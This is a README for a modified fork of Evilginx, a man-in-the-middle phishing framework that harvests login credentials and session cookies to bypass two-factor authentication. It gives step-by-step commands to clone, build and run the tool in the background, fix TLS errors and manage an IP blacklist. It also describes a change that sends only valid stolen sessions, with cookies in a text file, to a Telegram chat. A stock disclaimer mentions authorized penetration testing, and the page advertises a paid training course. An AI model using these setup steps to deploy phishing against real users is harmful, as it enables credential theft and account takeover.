# Evilginx 3.0
```
- git clone https://github.com/larryomakh/evilginx_modified_telegram_notifications.git
- cd evilginx_modified_telegram_notifications
- ./evilginx2 # and exit
- nano /root/.evilginx/config.json ## add chatid and teletoken and save and exit
- ./evilginx2
```

---

## 🖥️ Deploying on Ubuntu Server

**1. Clone the repository:**
```sh
git clone https://github.com/larryomakh/evilginx_modified_telegram_notifications.git
cd evilginx_modified_telegram_notifications
```

**2. Make sure Go 1.22+ is installed:**
```sh
go version  # Should show go1.22.x or newer
```
If you see an older version, upgrade Go:
```sh
rm -rf /usr/local/go
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz
tar -C /usr/local -xzf go1.22.0.linux-amd64.tar.gz
export PATH=/usr/local/go/bin:$PATH
echo 'export PATH=/usr/local/go/bin:$PATH' >> ~/.profile
source ~/.profile
go version
```

**3. Build and run Evilginx:**
```sh
go build -o evilginx2 .
./evilginx2
```

**4. Running in the background:**
```sh
nohup ./evilginx2 > evilginx2.log 2>&1 &
```

---

## ⚠️ TLS Certificate Troubleshooting
If you see this error:
```
[!!!] certdb: tls: private key does not match public key
```
- Evilginx is trying to load a mismatched TLS certificate and private key from `/root/.evilginx`.
- To fix, delete the files in `/root/.evilginx` and restart Evilginx:
```sh
rm -rf /root/.evilginx/*
./evilginx2
```
- Evilginx will attempt to generate/request new certificates.

---

## 🚫 Managing the Blacklist (Block/Unblock IPs)

**Blacklist file location:** By default, Evilginx loads blacklisted IPs and CIDR masks from a file (often `/root/.evilginx/blacklist.txt` or similar; check logs or config for the exact path).

### ➕ Adding to the Blacklist

**Method 1: Manually edit the blacklist file**
1. Open the blacklist file:
   ```sh
   nano /root/.evilginx/blacklist.txt
   ```
2. Add each IP or CIDR (subnet) on a new line. Examples:
   ```
   123.123.123.123
   10.0.0.0/8
   ```
3. Save and exit.
4. Restart Evilginx for changes to take effect:
   ```sh
   pkill evilginx2
   ./evilginx2
   ```

**Method 2: Programmatically (from Go code)**
- Evilginx uses the `AddIP` method in `core/blacklist.go` to add an IP:
  ```go
  err := blacklist.AddIP("123.123.123.123")
  ```

### ➖ Removing from the Blacklist

1. Open the blacklist file:
   ```sh
   nano /root/.evilginx/blacklist.txt
   ```
2. Delete the line(s) for IPs or subnets you want to remove.
3. Save and exit.
4. Restart Evilginx:
   ```sh
   pkill evilginx2
   ./evilginx2
   ```

### 🔎 Where is the Blacklist File?
- The path is usually displayed in Evilginx logs at startup (look for `loading blacklist from: ...`).
- Common locations: `/root/.evilginx/blacklist.txt`, `blacklist.txt` in the Evilginx directory, or as configured in your setup.

### 📝 Example
To block `8.8.8.8` and the entire `192.168.1.0/24` subnet:
```
8.8.8.8
192.168.1.0/24
```
To unblock, simply remove those lines and restart Evilginx.

---
Big Thanks to [kgretzky](https://github.com/kgretzky/) for Creating such great tool  
---

**Evilginx** is a man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows to bypass 2-factor authentication protection.

This tool is a successor to [Evilginx](https://github.com/kgretzky/evilginx), released in 2017, which used a custom version of nginx HTTP server to provide man-in-the-middle functionality to act as a proxy between a browser and phished website.
Present version is fully written in GO as a standalone application, which implements its own HTTP and DNS server, making it extremely easy to set up and use.

<p align="center">
  <img alt="Screenshot" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/screen.png" height="320" />
</p>

---
This has been modified to only send valid sessions, no empty logs, and will include the cookies in a randomly named TXT file. 📂✅🍪

![image (4)](https://github.com/user-attachments/assets/a102ecd7-e342-44c4-bff5-3004d16c0df4)
---

## Disclaimer

I am very much aware that Evilginx can be used for nefarious purposes. This work is merely a demonstration of what adept attackers can do. It is the defender's responsibility to take such attacks into consideration and find ways to protect their users against this type of phishing attacks. Evilginx should be used only in legitimate penetration testing assignments with written permission from to-be-phished parties.


---
## 🧑‍🏫 Evilginx Training Course

> 🔥 *Already mastering Evilginx? Level up with my complete [Evilginx Training Course](https://shop.fluxxset.com/product/evilginx-training-course/). Check it out!*

![Evilginx Training Course Banner](http://shop.fluxxset.com/wp-content/uploads/2024/08/Evilginx_course.png)
<!-- ## 🧑‍🏫 Evilginx Training Course

Ready to become an Evilginx master? Check out my [Complete Evilginx Training Course](https://shop.fluxxset.com/product/evilginx-training-course/)! It covers everything from setting up Evilginx, creating advanced phishlets, to deploying custom plugins with Python. It's packed with *tips, tricks*, and *real-world examples*. -->

---
